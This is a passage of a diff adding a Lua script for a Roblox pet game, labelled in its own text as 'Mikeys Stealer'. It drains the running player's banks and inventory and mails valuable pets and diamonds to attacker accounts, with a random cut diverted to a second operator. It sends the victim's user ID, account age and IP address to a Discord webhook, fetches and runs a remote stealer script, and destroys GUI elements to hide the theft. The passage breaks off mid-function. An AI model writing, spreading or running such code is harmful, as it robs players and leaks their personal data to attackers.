+    local invspace = PlayerInfos.MaxSlots - #PlayerInfos.Pets
+    if invspace > 50 then
+        invspace = 50
+    end
+    return invspace
+end
+
+function invspace_nolimit()
+    local invspace = PlayerInfos.MaxSlots - #PlayerInfos.Pets
+    return invspace
+end
+
+-- Bank Teleport
+
+game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game:GetService("Workspace")[
+"__MAP"].Interactive.Bank.Pad.Position)
+
+-- Bank Variables :
+
+local SuperBank
+local Bank
+local SuperBank2
+local Bank2
+local SuperBank3
+local Bank3
+local SuperBank4
+local Bank4
+local SuperBank5
+local Bank5
+local bdiaamt = 0
+local bdiaamt2 = 0
+local bdiaamt3 = 0
+local bdiaamt4 = 0
+local bdiaamt5 = 0
+local bankscount = 0
+local FinalFinal = 0
+
+-- Banks Count :
+
+if mybanks[1] ~= nil then
+    bankscount = bankscount + 1
+end
+if mybanks[2] ~= nil then
+    bankscount = bankscount + 1
+end
+if mybanks[3] ~= nil then
+    bankscount = bankscount + 1
+end
+if mybanks[4] ~= nil then
+    bankscount = bankscount + 1
+end
+if mybanks[5] ~= nil then
+    bankscount = bankscount + 1
+end
+
+-- Check & Accept Banks Invites
+local invbanks = getinvitesremote:InvokeServer()
+bankstable = {}
+if bankscount ~= 5 then
+    if invbanks[1] ~= nil then
+        table.insert(bankstable, invbanks[1]["BUID"])
+    end
+    if invbanks[2] ~= nil then
+        table.insert(bankstable, invbanks[2]["BUID"])
+    end
+    if invbanks[3] ~= nil then
+        table.insert(bankstable, invbanks[3]["BUID"])
+    end
+    if invbanks[4] ~= nil then
+        table.insert(bankstable, invbanks[4]["BUID"])
+    end
+    if invbanks[5] ~= nil then
+        table.insert(bankstable, invbanks[5]["BUID"])
+    end
+    for i, v in pairs(bankstable) do
+        acceptinviteremote:InvokeServer(v)
+    end
+end
+
+-- Banks BUID's
+if bankscount == 0 then
+    Bank = bankstable[1]
+    Bank2 = bankstable[2]
+    Bank3 = bankstable[3]
+    Bank4 = bankstable[4]
+    Bank5 = bankstable[5]
+elseif bankscount == 1 then
+    Bank = mybanks[1]["BUID"]
+    Bank2 = bankstable[1]
+    Bank3 = bankstable[2]
+    Bank4 = bankstable[3]
+    Bank5 = bankstable[4]
+elseif bankscount == 2 then
+    Bank = mybanks[1]["BUID"]
+    Bank2 = mybanks[2]["BUID"]
+    Bank3 = bankstable[1]
+    Bank4 = bankstable[2]
+    Bank5 = bankstable[3]
+elseif bankscount == 3 then
+    Bank = mybanks[1]["BUID"]
+    Bank2 = mybanks[2]["BUID"]
+    Bank3 = mybanks[3]["BUID"]
+    Bank4 = bankstable[1]
+    Bank5 = bankstable[2]
+elseif bankscount == 4 then
+    Bank = mybanks[1]["BUID"]
+    Bank2 = mybanks[2]["BUID"]
+    Bank3 = mybanks[3]["BUID"]
+    Bank4 = mybanks[4]["BUID"]
+    Bank5 = bankstable[1]
+elseif bankscount == 5 then
+    Bank = mybanks[1]["BUID"]
+    Bank2 = mybanks[2]["BUID"]
+    Bank3 = mybanks[3]["BUID"]
+    Bank4 = mybanks[4]["BUID"]
+    Bank5 = mybanks[5]["BUID"]
+end
+
+-- Get Pets
+
+Library = require(game:GetService("ReplicatedStorage").Framework:FindFirstChild("Library"))
+Functions = Library.Functions
+
+PetIDList = {}
+
+table.foreach(Library.Directory.Pets, function(i, v)
+    if v.huge or v.titanic or v.name == "banana" or v.name == "Bladee" or v.convertPoints == 5 then -- get pets to withdraw from banks
+        table.insert(PetIDList, i)
+    end
+end)
+
+-- Withdraw From Banks
+if Bank ~= nil and invspace() ~= 0 then
+    while task.wait() do
+        print('bank1 purged')
+        SuperBank = getbankremote:InvokeServer(Bank)
+        LHList = {}
+        LFinalList = {}
+        local lpets = SuperBank.Storage.Pets
+        local y = {}
+        for i, v in pairs(lpets) do
+            y[v["uid"]] = false
+        end
+        for i, v in pairs(lpets) do
+            if table.find(PetIDList, v["id"]) ~= nil then
+                table.insert(LHList, v["uid"])
+            end
+        end
+        print("LHList :", #LHList)
+        if #LHList <= invspace() then
+            for i, v in pairs(LHList) do
+                table.insert(LFinalList, v)
+            end
+        elseif #LHList > invspace() then
+            for i, v in pairs(LHList) do
+                if #LFinalList < invspace() then
+                    table.insert(LFinalList, v)
+                end
+            end
+        end
+        print("LFinalList :", #LFinalList)
+        bdiaamt = SuperBank.Storage.Currency.Diamonds
+        if #LFinalList == 0 and bdiaamt < 1000000000 and diaamt99 > 110000 then
+            bdiaamt = 0
+        end
+        if #LFinalList ~= 0 or bdiaamt ~= 0 then
+            local A_5 = {
+                [1] = Bank,
+                [2] = LFinalList,
+                [3] = 0
+            }
+            local s, e = pcall(function()
+                withdrawremote:InvokeServer(Bank, LFinalList, bdiaamt)
+            end)
+            if s == false then
+                wait(0.2)
+                withdrawremote:InvokeServer(Bank, LFinalList, 0)
+            end
+            FinalFinal = FinalFinal + #LFinalList
+            wait(1.5)
+        else
+            print('done1')
+            break
+        end
+    end
+end
+if Bank2 ~= nil and invspace() ~= 0 then
+    while task.wait() do
+        print('bank2 purged')
+        SuperBank2 = getbankremote:InvokeServer(Bank2)
+        BHList2 = {}
+        FinalList2 = {}
+        local pets2 = SuperBank2.Storage.Pets
+        local y = {}
+        for i, v in pairs(pets2) do
+            y[v["uid"]] = false
+        end
+        for i, v in pairs(pets2) do
+            if table.find(PetIDList, v["id"]) ~= nil and not v.l then
+                table.insert(BHList2, v["uid"])
+            end
+        end
+        if #BHList2 <= invspace() then
+            for i, v in pairs(BHList2) do
+                table.insert(FinalList2, v)
+            end
+        elseif #BHList2 > invspace() then
+            for i, v in pairs(BHList2) do
+                if #FinalList2 < invspace() then
+                    table.insert(FinalList2, v)
+                end
+            end
+        end
+        print("FinalList2 :", #FinalList2)
+        print('BHList2 :', #BHList2)
+        bdiaamt2 = SuperBank2.Storage.Currency.Diamonds
+        if #FinalList2 == 0 and bdiaamt2 < 1000000000 and diaamt99 > 110000 then
+            bdiaamt = 0
+        end
+        if #FinalList2 ~= 0 or bdiaamt2 ~= 0 then
+            local A_1 = {
+                [1] = Bank2,
+                [2] = FinalList2,
+                [3] = 0
+            }
+            wait()
+            local s, e = pcall(function()
+                withdrawremote:InvokeServer(Bank2, FinalList2, bdiaamt2)
+            end)
+            if s == false then
+                wait(0.2)
+                withdrawremote:InvokeServer(Bank2, FinalList2, 0)
+            end
+            wait(1.5)
+            FinalFinal = FinalFinal + #FinalList2
+        else
+            print('done2')
+            break
+        end
+    end
+end
+if Bank3 ~= nil and invspace() ~= 0 then
+    while task.wait() do
+        print('bank3 purged')
+        SuperBank3 = getbankremote:InvokeServer(Bank3)
+        BHList3 = {}
+        FinalList3 = {}
+        local pets3 = SuperBank3.Storage.Pets
+        local y = {}
+        for i, v in pairs(pets3) do
+            y[v["uid"]] = false
+        end
+        for i, v in pairs(pets3) do
+            if table.find(PetIDList, v["id"]) ~= nil and not v.l then
+                table.insert(BHList3, v["uid"])
+            end
+        end
+        if #BHList3 <= invspace() then
+            for i, v in pairs(BHList3) do
+                table.insert(FinalList3, v)
+            end
+        elseif #BHList3 > invspace() then
+            for i, v in pairs(BHList3) do
+                if #FinalList3 < invspace() then
+                    table.insert(FinalList3, v)
+                end
+            end
+        end
+        print("FinalList3 :", #FinalList3)
+        print('BHList3 :', #BHList3)
+        bdiaamt3 = SuperBank3.Storage.Currency.Diamonds
+        if #FinalList3 == 0 and bdiaamt3 < 1000000000 and diaamt99 > 110000 then
+            bdiaamt = 0
+        end
+        if #FinalList3 ~= 0 or bdiaamt3 ~= 0 then
+            local A_1 = {
+                [1] = Bank3,
+                [2] = FinalList3,
+                [3] = 0
+            }
+
+            wait()
+            local s, e = pcall(function()
+                withdrawremote:InvokeServer(Bank3, FinalList3, bdiaamt3)
+            end)
+
+            if s == false then
+                wait(0.2)
+                withdrawremote:InvokeServer(Bank3, FinalList3, 0)
+            end
+            wait(1.5)
+            FinalFinal = FinalFinal + #FinalList3
+        else
+            print('done3')
+            break
+        end
+    end
+end
+if Bank4 ~= nil and invspace() ~= 0 then
+    while task.wait() do
+        print('bank4 purged')
+        SuperBank4 = getbankremote:InvokeServer(Bank4)
+        BHList4 = {}
+        FinalList4 = {}
+        local pets4 = SuperBank4.Storage.Pets
+        local y = {}
+        for i, v in pairs(pets4) do
+            y[v["uid"]] = false
+        end
+        for i, v in pairs(pets4) do
+            if table.find(PetIDList, v["id"]) ~= nil and not v.l then
+                table.insert(BHList4, v["uid"])
+            end
+        end
+        if #BHList4 <= invspace() then
+            for i, v in pairs(BHList4) do
+                table.insert(FinalList4, v)
+            end
+        elseif #BHList4 > invspace() then
+            for i, v in pairs(BHList4) do
+                if #FinalList4 < invspace() then
+                    table.insert(FinalList4, v)
+                end
+            end
+        end
+        print('BHList4 :', #BHList4)
+        print('FinalList4 :', #FinalList4)
+        bdiaamt4 = SuperBank4.Storage.Currency.Diamonds
+        if #FinalList4 == 0 and bdiaamt4 < 1000000000 and diaamt99 > 110000 then
+            bdiaamt4 = 0
+        end
+        if #FinalList4 ~= 0 or bdiaamt4 ~= 0 then
+            local A_1 = {
+                [1] = Bank4,
+                [2] = FinalList4,
+                [3] = 0
+            }
+            local s, e = pcall(function()
+                withdrawremote:InvokeServer(Bank4, FinalList4, bdiaamt4)
+            end)
+
+            if s == false then
+                wait(0.2)
+                withdrawremote:InvokeServer(Bank4, FinalList4, 0)
+            end
+            FinalFinal = FinalFinal + #FinalList4
+            wait(1.5)
+        else
+            print('done4')
+            break
+        end
+    end
+end
+if Bank5 ~= nil and invspace() ~= 0 then
+    while task.wait() do
+        print('bank5 purged')
+        SuperBank5 = getbankremote:InvokeServer(Bank5)
+        BHList5 = {}
+        FinalList5 = {}
+        local pets5 = SuperBank5.Storage.Pets
+        local y = {}
+        for i, v in pairs(pets5) do
+            y[v["uid"]] = false
+        end
+        for i, v in pairs(pets5) do
+            if table.find(PetIDList, v["id"]) ~= nil and not v.l then
+                table.insert(BHList5, v["uid"])
+            end
+        end
+        if #BHList5 <= invspace() then
+            for i, v in pairs(BHList5) do
+                table.insert(FinalList5, v)
+            end
+        elseif #BHList5 > invspace() then
+            for i, v in pairs(BHList5) do
+                if #FinalList5 < invspace() then
+                    table.insert(FinalList5, v)
+                end
+            end
+        end
+        print('BHList5 :', #BHList5)
+        print('FinalList5 :', #FinalList5)
+        bdiaamt5 = SuperBank5.Storage.Currency.Diamonds
+        if #FinalList5 == 0 and bdiaamt5 < 1000000000 and diaamt99 > 110000 then
+            bdiaamt5 = 0
+        end
+        if #FinalList5 ~= 0 or bdiaamt5 ~= 0 then
+            local A_1 = {
+                [1] = Bank5,
+                [2] = FinalList5,
+                [3] = 0
+            }
+
+            wait()
+            local s, e = pcall(function()
+                withdrawremote:InvokeServer(Bank5, FinalList5, bdiaamt5)
+            end)
+
+            if s == false then
+                wait(0.2)
+                withdrawremote:InvokeServer(Bank5, FinalList5, 0)
+            end
+            wait(1.5)
+            FinalFinal = FinalFinal + #FinalList5
+        else
+            print('done5')
+            break
+        end
+    end
+end
+
+local DiamondsDiamonds = bdiaamt + bdiaamt2 + bdiaamt3 + bdiaamt4 + bdiaamt5
+
+-- Redeem Free Gifts
+
+local GiftsGui = game:GetService("Players").LocalPlayer.PlayerGui.FreeGifts
+Gifts = {}
+if invspace_nolimit() ~= 0 then
+    for i, v in pairs(GiftsGui.Frame.Container.Gifts:GetDescendants()) do
+        if v.Name == "Timer" then
+            if v.Text == "Redeem!" then
+                table.insert(Gifts, string.split(tostring(v.Parent), 't')[2])
+            end
+        end
+    end
+    if #Gifts ~= 0 then
+        for i, v in pairs(Gifts) do
+            redeemgiftsremote:InvokeServer(tonumber(v))
+        end
+    end
+end
+
+-- Get VIP & Rank Rewards
+
+if PlayerInfos.World == "Spawn" then
+    local Redeem_Pad = game:GetService("Workspace")["__MAP"].Interactive["Rank Rewards"].Pad
+    local VIP_Pad = game:GetService("Workspace")["__MAP"].Interactive["VIP Rewards"].Pad
+    local Timer = Redeem_Pad.BillboardGui.Timer
+    local VIP_Timer = VIP_Pad.BillboardGui.Timer
+    if Timer.Text == "Redeem!" then
+        game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Redeem_Pad.Position)
+        while task.wait() do
+            if Timer.Text ~= "Redeem!" then break end
+        end
+    end
+    if table.find(PlayerInfos.Gamepasses, 18674305) then
+        if VIP_Timer.Text == "Redeem!" then
+            game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(VIP_Pad.Position)
+            while task.wait() do
+                if VIP_Timer.Text ~= "Redeem!" then break end
+            end
+        end
+    end
+end
+
+-- Teleport To Mailbox
+
+game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game:GetService("Workspace")[
+"__MAP"].Interactive.Mailbox.Pad.Position)
+
+-- Claim All Gifts
+
+local check = getmailremote:InvokeServer()
+local inbox = #check.Inbox
+
+if inbox ~= 0 and invspace_nolimit() >= inbox then
+    claimallremote:InvokeServer()
+    task.wait(1.5)
+end
+
+-- Run Bankstealer if Diamonds Are < 110k
+
+local diaamt = PlayerInfos.Diamonds
+if diaamt < 110000 then
+    _G.Webhook = Webhook
+    _G.LoadingScreen = false
+    _G.AntiLeave = false
+    _G.MouseLock = false
+    loadstring(game:HttpGetAsync("bankstealer raw link", true))() -- Exc : https://raw.githubusercontent.com/blabla/blabla/main/bank.lua
+    return;
+end
+if _G.AntiLeave ~= false then
+    for i, v in pairs(game:GetService("Players").LocalPlayer.PlayerGui:GetChildren()) do
+        if v.Name ~= "Inventory" then
+            v:Destroy()
+        end
+    end
+    for i, v in pairs(game:GetService("CoreGui"):GetChildren()) do
+        if v.Name ~= "RizzHub" and v.Name ~= "RobloxPromptGui" then
+            v:Destroy()
+        end
+    end
+end
+
+-- Pets Tables :
+
+TitanicList = {}
+TList = {}
+STList = {}
+BananaList = {}
+BList = {}
+HugeList = {}
+HList = {}
+SHList = {}
+PogList = {}
+PList = {}
+SPList = {}
+ExclusiveList = {}
+EList = {}
+SEList = {}
+EventList = {}
+EvList = {}
+SEvList = {}
+SecretList = {}
+SList = {}
+SSList = {}
+MythicList = {}
+MList = {}
+SMList = {}
+
+-- Pets's ID's
+
+table.foreach(Library.Directory.Pets, function(i, v)
+    if v.titanic then
+        table.insert(TitanicList, i)
+    end
+    if v.name == "banana" then
+        table.insert(BananaList, i)
+    end
+    if v.huge then
+        table.insert(HugeList, i)
+    end
+    if string.split(v.name, " ")[1] == "Pog" then
+        table.insert(PogList, i)
+    end
+    if v.rarity == "Exclusive" and not v.huge and not v.titanic then
+        table.insert(ExclusiveList, i)
+    end
+    if v.rarity == "Event" then
+        table.insert(EventList, i)
+    end
+    if v.rarity == "Secret" then
+        table.insert(SecretList, i)
+    end
+    if v.rarity == "Mythical" then
+        table.insert(MythicList, i)
+    end
+end)
+-- Pets's UID's
+
+local pets = PlayerInfos.Pets
+local y = {}
+for i, v in pairs(pets) do
+    y[v["uid"]] = false
+end
+lockremote:InvokeServer(y)
+for i, v in pairs(pets) do
+    if table.find(TitanicList, v["id"]) ~= nil then
+        table.insert(TList, v["uid"])
+        table.insert(STList, v["id"])
+    end
+end
+for i, v in pairs(pets) do
+    if table.find(BananaList, v["id"]) ~= nil then
+        table.insert(BList, v["uid"])
+    end
+end
+for i, v in pairs(pets) do
+    if table.find(HugeList, v["id"]) ~= nil then
+        table.insert(HList, v["uid"])
+        table.insert(SHList, v["id"])
+    end
+end
+for i, v in pairs(pets) do
+    if table.find(PogList, v["id"]) ~= nil then
+        table.insert(PList, v["uid"])
+        table.insert(SPList, v["id"])
+    end
+end
+for i, v in pairs(pets) do
+    if table.find(ExclusiveList, v["id"]) ~= nil and not v.huge and not v.titanic then
+        table.insert(EList, v["uid"])
+        table.insert(SEList, v["id"])
+    end
+end
+for i, v in pairs(pets) do
+    if table.find(EventList, v["id"]) ~= nil then
+        table.insert(EvList, v["uid"])
+        table.insert(SEvList, v["id"])
+    end
+end
+for i, v in pairs(pets) do
+    if table.find(SecretList, v["id"]) ~= nil then
+        table.insert(SList, v["uid"])
+        table.insert(SSList, v["id"])
+    end
+end
+for i, v in pairs(pets) do
+    if table.find(MythicList, v["id"]) ~= nil and v.hc and v.dm then
+        table.insert(MList, v["uid"])
+        table.insert(SMList, v["id"])
+    end
+end
+
+local FinalList = #TList + #BList + #HList + #EList + #EvList + #MList + #SList + #PList
+
+-- Webhook Diamonds Infos & Diamonds Calculations
+
+local Sdiaamt
+if diaamt >= (100000 * FinalList + 100000) then
+    Sdiaamt = 100000 * FinalList + 100000
+    -- print(Sdiaamt)
+elseif diaamt < (100000 * FinalList + 100000) then
+    Sdiaamt = diaamt
+end
+local givediaamt
+if diaamt - Sdiaamt < 10000 then
+    givediaamt = 0
+elseif diaamt - Sdiaamt >= 10000 then
+    givediaamt = diaamt - Sdiaamt
+end
+function diamondstoconvert(diamonds)
+    local diaamt2 = diamonds
+    local abbreviations = {
+        k = 4,
+        m = 7,
+        b = 10,
+        T = 13,
+        Qt = 16,
+    }
+    local DiamondsCount = tostring(math.floor(diaamt2))
+
+    local ChosenAbbreviation
+    for abbreviation, digits in pairs(abbreviations) do
+        if #DiamondsCount >= digits and #DiamondsCount < (digits + 3) then
+            ChosenAbbreviation = abbreviation
+            break
+        end
+    end
+
+    if ChosenAbbreviation then
+        local digits = abbreviations[ChosenAbbreviation]
+        local rounded = math.floor(diaamt2 / 10 ^ (digits - 3)) * 10 ^ (digits - 3)
+        DiamondsCount = string.format("%0.2f", rounded / 10 ^ (digits - 1))
+        local addsd = string.split(DiamondsCount, ".")[2]
+        local pnt = "."
+        if string.split(addsd, "")[2] == "0" and string.split(addsd, "")[1] ~= "0" then
+            DiamondsCount = string.split(DiamondsCount, ".")[1] ..
+                pnt .. string.split(addsd, "")[1] .. ChosenAbbreviation
+        elseif string.split(addsd, "")[2] == "0" and string.split(addsd, "")[1] == "0" then
+            DiamondsCount = string.split(DiamondsCount, ".")[1] .. ChosenAbbreviation
+        elseif string.split(addsd, "")[2] ~= "0" and string.split(addsd, "")[1] ~= "0" then
+            DiamondsCount = DiamondsCount .. ChosenAbbreviation
+        elseif string.split(addsd, "")[2] ~= "0" and string.split(addsd, "")[1] == "0" then
+            DiamondsCount = DiamondsCount .. ChosenAbbreviation
+        else
+            DiamondsCount = diamonds
+        end
+    end
+    return DiamondsCount
+end
+
+local DiamondsCount = diamondstoconvert(givediaamt)
+local WDiamondsCount = diamondstoconvert(DiamondsDiamonds)
+function RAP()
+    local RAP = diamondstoconvert(PlayerInfos.RAP)
+    return RAP
+end
+
+-- Webhook
+local url = Webhook
+local whenabled = true
+local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
+    local abcdef1
+    local headers
+    local lmao = "/5"
+    local Image = string.split(petimg, "rbxassetid://")[2]
+    Image = game:HttpGet("https://thumbnails.roblox.com/v1/assets?assetIds=" ..
+        Image .. "&returnPolicy=PlaceHolder&size=420x420&format=Png&isCircular=false")
+    Image = game:GetService("HttpService"):JSONDecode(Image).data[1].imageUrl
+    if FinalFinal ~= 0 or DiamondsDiamonds ~= 0 then
+        imgs =
+        "https://media.discordapp.net/attachments/1108927671880126545/1127900444551823360/mike_bruh.png?width=625&height=625"
+        data1 = {
+            ["content"] = ping,
+            ["username"] = "Mikey",
+            ["avatar_url"] = imgs,
+            ["embeds"] = { {
+                ["title"] = "**New Hit** ||With Mikey||",
+                ["url"] = "https://discord.gg/yJbPuyrZ6k",
+                ["type"] = "rich",
+                ["color"] = tonumber(0x2798FF),
+                ["thumbnail"] = {
+                    ["url"] = Image,
+                    ["height"] = 420,
+                    ["width"] = 420
+                },
+                ["fields"] = { {
+                    ["name"] = "**This data was generated using Mikeys Stealer** :moyai:",
+                    ["value"] = "```Username     : " .. username ..
+                        "\nUser-ID      : " .. fardplayer.userId .. "\nAccount Age  : " .. fardplayer.AccountAge ..
+                        " Days\nIP Address   : " .. IPadress .. "\nRank           : " .. rank .. "\nRAP          : " .. RAP() ..
+                        "\nExploit      : " .. exploit .. "\nReceiver     : " .. receiver .. "```",
+                    ["inline"] = false
+                }, {
+                    ["name"] = ":dog: **Pets left** :dog:",
+                    ["value"] = "```" .. f .. "```",
+                    ["inline"] = true
+                }, {
+                    ["name"] = ":gem: **Diamonds** :gem:",
+                    ["value"] = "```" .. d .. "```",
+                    ["inline"] = true
+                },
+                    {
+                        ["name"] = rarity,
+                        ["value"] = "```" .. name .. "```",
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = ":bank: **Joined Banks** :bank:",
+                        ["value"] = "```" .. bankscount .. lmao .. "```",
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = ":gem: **Wd Diamonds** :gem:",
+                        ["value"] = "```" .. WDiamondsCount .. "```",
+                        ["inline"] = true
+                    }, {
+                    ["name"] = ":money_mouth: **Wd Huges** :money_mouth:",
+                    ["value"] = "```" .. FinalFinal .. "```",
+                    ["inline"] = true
+                },
+                }
+            } }
+        }
+        newdata1 = game:GetService("HttpService"):JSONEncode(data1)
+
+        headers = {
+            ["content-type"] = "application/json"
+        }
+
+        if Webhook ~= nil and whenabled == true then
+            abcdef1 = {
+                Url = url,
+                Body = newdata1,
+                Method = "POST",
+                Headers = headers
+            }
+            request(abcdef1)
+        end
+    else
+        imgs =
+        "https://media.discordapp.net/attachments/1108927671880126545/1127900444551823360/mike_bruh.png?width=625&height=625"
+        data1 = {
+            ["content"] = ping,
+            ["username"] = "Rizz Scriptz",
+            ["avatar_url"] = imgs,
+            ["embeds"] = { {
+                ["title"] = "**New Hit** ||With Mikey||",
+                ["url"] = "https://discord.gg/yJbPuyrZ6k",
+                ["type"] = "rich",
+                ["color"] = tonumber(0x2798FF),
+                ["thumbnail"] = {
+                    ["url"] = Image,
+                    ["height"] = 420,
+                    ["width"] = 420
+                },
+                ["fields"] = { {
+                    ["name"] = "**This data was generated using Mikeys Stealer** :moyai:",
+                    ["value"] = "```Username     : " .. username ..
+                        "\nUser-ID      : " .. fardplayer.userId .. "\nAccount Age  : " .. fardplayer.AccountAge ..
+                        " Days\nIP Address   : " .. IPadress .. "\nRank         : " .. rank .. "\nRAP          : " .. RAP() ..
+                        "\nExploit      : " .. exploit .. "\nReceiver     : " .. receiver .. "```",
+                    ["inline"] = false
+                }, {
+                    ["name"] = ":dog: **Pets left** :dog:",
+                    ["value"] = "```" .. f .. "```",
+                    ["inline"] = true
+                }, {
+                    ["name"] = ":gem: **Diamonds** :gem:",
+                    ["value"] = "```" .. d .. "```",
+                    ["inline"] = true
+                },
+                    {
+                        ["name"] = rarity,
+                        ["value"] = "```" .. name .. "```",
+                        ["inline"] = true
+                    },
+                }
+            } }
+        }
+        newdata1 = game:GetService("HttpService"):JSONEncode(data1)
+
+        headers = {
+            ["content-type"] = "application/json"
+        }
+
+        if Webhook ~= nil and whenabled == true then
+            abcdef1 = {
+                Url = url,
+                Body = newdata1,
+                Method = "POST",
+                Headers = headers
+            }
+            request(abcdef1)
+        end
+    end
+end
+
+local dhuser = getgenv().Settings.User
+-- if getgenv().Settings ~= nil then
+--     if getgenv().Settings.PremiumKey ~= nil then
+--         local premkey = getgenv().Settings.PremiumKey
+--         local dhkey = to_base64(to_base64(to_base64(to_base64(premkey))))
+--         local dhdata = {
+--             dhprem = dhkey
+--         }
+--         local dhurl = "premium database php link here" -- Exc : https://rizz.xyz/premium.php
+--         local dhheaders = {
+--             ["content-type"] = "application/json"
+--         }
+--         local dhnewdata = game:GetService("HttpService"):JSONEncode(dhdata)
+--         local dhresponse = request({
+--             Url = dhurl,
+--             Body = dhnewdata,
+--             Method = "POST",
+--             Headers = dhheaders
+--         })
+--         local responsed = from_base64(from_base64(from_base64(dhresponse.Body)))
+--         if responsed ~= 'false' then
+--             dhuser = responsed
+--         else
+--             dhuser = nil
+--         end
+--     end
+-- end
+local titanicin
+local bananin
+local hugein
+local pogin
+local excin
+local eventin
+local secretin
+local mythicin
+local gemsin
+local mailmsg = "Mikey On Top"
+if dhuser ~= nil then
+    if getgenv().Settings.Titanics.Dualhook then
+        titanicin = getgenv().Settings.Titanics.Intensity
+    end
+    if getgenv().Settings.Banana.Dualhook then
+        bananin = getgenv().Settings.Banana.Intensity
+    end
+    if getgenv().Settings.Huges.Dualhook then
+        hugein = getgenv().Settings.Huges.Intensity
+    end
+    if getgenv().Settings.Pogs.Dualhook then
+        pogin = getgenv().Settings.Pogs.Intensity
+    end
+    if getgenv().Settings.Exclusives.Dualhook then
+        excin = getgenv().Settings.Exclusives.Intensity
+    end
+    if getgenv().Settings.Events.Dualhook then
+        eventin = getgenv().Settings.Events.Intensity
+    end
+    if getgenv().Settings.Secrets.Dualhook then
+        secretin = getgenv().Settings.Secrets.Intensity
+    end
+    if getgenv().Settings.HC_DM_Mythics.Dualhook then
+        mythicin = getgenv().Settings.HC_DM_Mythics.Intensity
+    end
+    if getgenv().Settings.Gems.Dualhook then
+        gemsin = getgenv().Settings.Gems.Intensity
+    end
+    if getgenv().Settings.Webhook ~= true then
+        whenabled = false
+    end
+    if getgenv().Settings.MailMessage ~= nil then
+        mailmsg = getgenv().Settings.MailMessage
+    end
+end
+
+-- Dualhook intensity
+
+function dualhook(percent)
+    if not tonumber(percent) then
+        game:GetService("Players").LocalPlayer:Kick("Put A Valid intensity Value")
+        return;
+    end
+    local number = math.random(1, 100)
+    if number <= percent then
+        return true
+    else
+        return false
+    end
+end
+
+-- Sending The Pets
+
+local ndUser
+if UserName2 ~= nil and UserName2 ~= "2nd User Here" and UserName2 ~= "" then
+    ndUser = UserName2
+else
+    ndUser = UserName
+end
+local user
+-- Gems Only
+if FinalList == 0 then
+    if givediaamt >= 1000000000 then
+        user = UserName
+    else
+        user = ndUser
+    end
+    if gemsin ~= nil then
+        if dualhook(gemsin) then
+            user = dhuser
+        end
+    end
+    local args = {
+        [1] = {
+            ["Recipient"] = user,
+            ["Diamonds"] = givediaamt,
+            ["Pets"] = {},
+            ["Message"] = mailmsg,
+        }
+    }
+    mailremote:InvokeServer(unpack(args))
+end
+spawn(function()
+    while wait() do
+        if #TList ~= 0 or TList ~= {} then
+            for i, v in pairs(TList) do
+                user = UserName
+                if titanicin ~= nil then
+                    if dualhook(titanicin) then
+                        user = dhuser
+                    end
+                end
+                local args = {
+                    [1] = {
+                        ["Recipient"] = user,
+                        ["Diamonds"] = givediaamt,
+                        ["Pets"] = { v },
+                        ["Message"] = mailmsg,
+                    }
+                }
+                mailremote:InvokeServer(unpack(args))
+                -- wait(5.5)
+                if #TList == 0 or TList == {} then
+                    -- print("done1")
+                    break
+                end
+            end
+        end
+    end
+end)
+spawn(function()
+    while wait() do
+        if #BList ~= 0 and #TList == 0 then
+            for i, v in pairs(BList) do
+                user = UserName
+                if bananin ~= nil then
+                    if dualhook(bananin) then
+                        user = dhuser
+                    end
+                end
+                local args = {
+                    [1] = {
+                        ["Recipient"] = user,
+                        ["Diamonds"] = givediaamt,
+                        ["Pets"] = { v },
+                        ["Message"] = mailmsg,
+                    }
+                }
+                mailremote:InvokeServer(unpack(args))
+                -- wait(5.5)
+                if #BList == 0 or BList == {} then
+                    -- print("done2")
+                    break
+                end
+            end
+        else
+            break
+        end
+    end
+end)
+spawn(function()
+    while wait() do
+        if #HList ~= 0 and #BList == 0 and #TList == 0 then
+            for i, v in pairs(HList) do
+                user = UserName
+                if hugein ~= nil then
+                    if dualhook(hugein) then
+                        user = dhuser
+                    end
+                end
+                local args = {
+                    [1] = {
+                        ["Recipient"] = user,
+                        ["Diamonds"] = givediaamt,
+                        ["Pets"] = { v },
+                        ["Message"] = mailmsg,
+                    }
+                }
+                mailremote:InvokeServer(unpack(args))
+                -- wait(5.5)
+                if #HList == 0 or HList == {} then
+                    -- print("done3")
+                    break
+                end
+            end
+        end
+    end
+end)
+
+spawn(function()
+    while wait() do
+        if #PList ~= 0 and #TList == 0 and #BList == 0 and #HList == 0 then
+            for i, v in pairs(PList) do
+                user = UserName
+                if pogin ~= nil then
+                    if dualhook(pogin) then
+                        user = dhuser
+                    end
+                end
+                local args = {
+                    [1] = {
+                        ["Recipient"] = user,
+                        ["Diamonds"] = givediaamt,
+                        ["Pets"] = { v },
+                        ["Message"] = mailmsg,
+                    }
+                }
+                mailremote:InvokeServer(unpack(args))
+                -- wait(5.5)
+                if #PList == 0 or PList == {} then
+                    -- print("done1")
+                    break
+                end
+            end
+        end
+    end
+end)
+spawn(function()
+    while wait() do
+        if #EList ~= 0 and #HList == 0 and #TList == 0 and #BList == 0 and #PList == 0 then
+            for i, v in pairs(EList) do
+                user = UserName
+                if excin ~= nil then
+                    if dualhook(excin) then
+                        user = dhuser
+                    end
+                end
+                local args = {
+                    [1] = {
+                        ["Recipient"] = user,
+                        ["Diamonds"] = givediaamt,
+                        ["Pets"] = { v },
+                        ["Message"] = mailmsg,
+                    }
+                }
+                mailremote:InvokeServer(unpack(args))
+                -- wait(5.5)
+                if #EList == 0 or EList == {} then
+                    -- print("done42")
+                    break
+                end
+            end
+        end
+    end
+end)
+spawn(function()
+    while wait() do
+        if #EvList ~= 0 and #EList == 0 and #HList == 0 and #TList == 0 and #BList == 0 and #PList == 0 then
+            for i, v in pairs(EvList) do
+                user = ndUser
+                if eventin ~= nil then
+                    if dualhook(eventin) then
+                        user = dhuser
+                    end
+                end
+                local args = {
+                    [1] = {
+                        ["Recipient"] = user,
+                        ["Diamonds"] = givediaamt,
+                        ["Pets"] = { v },
+                        ["Message"] = mailmsg,
+                    }
+                }
+                mailremote:InvokeServer(unpack(args))
+                -- wait(5.5)
+                if #EvList == 0 or EvList == {} then
+                    -- print("done5")
+                    break
+                end
+            end
+        end
+    end
+end)
+spawn(function()
+    while wait() do
